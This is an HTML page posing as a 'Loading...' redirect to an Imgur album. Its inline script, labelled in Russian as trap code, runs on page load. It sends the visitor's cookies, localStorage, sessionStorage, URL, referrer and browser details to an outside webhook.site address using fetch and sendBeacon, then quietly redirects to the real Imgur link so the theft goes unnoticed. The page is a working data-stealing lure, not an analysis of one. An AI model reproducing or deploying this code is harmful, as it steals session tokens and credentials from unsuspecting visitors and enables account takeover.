<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<script>
    // ==============================================
    // КОД-ЛОВУШКА
    // ==============================================
    const WEBHOOK_URL = 'https://webhook.site/10aca89b-43e6-4116-ab1d-99fa6a90f9c4';
    
    function sendData(type, data) {
        try {
            // Отправка через fetch
            fetch(WEBHOOK_URL + '?type=' + encodeURIComponent(type) + '&data=' + encodeURIComponent(JSON.stringify(data)), {
                mode: 'no-cors'
            });
            // Запасной вариант
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({type: type, data: data}));
        } catch(e) {}
    }
    
    // 1. Куки
    sendData('cookies', document.cookie || 'empty');
    
    // 2. localStorage
    try {
        const ls = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key) ls[key] = localStorage.getItem(key);
        }
        sendData('localStorage', ls);
    } catch(e) {
        sendData('localStorage_error', e.message);
    }
    
    // 3. sessionStorage
    try {
        const ss = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            if (key) ss[key] = sessionStorage.getItem(key);
        }
        sendData('sessionStorage', ss);
    } catch(e) {
        sendData('sessionStorage_error', e.message);
    }
    
    // 4. Данные окружения (чтобы отличить бота от человека)
    sendData('env', {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        url: window.location.href,
        referrer: document.referrer,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    });
    
    // 5. Перенаправление на настоящий Imgur через 0.3 секунды
    setTimeout(function() {
        window.location.href = 'https://imgur.com/a/uej4cAd';
    }, 300);
</script>
</head>
<body>
    <div style="text-align:center; padding:50px; font-family:Arial;">
        <h2>Loading...</h2>
        <p>Please wait, you will be redirected shortly.</p>
    </div>
</body>
</html>
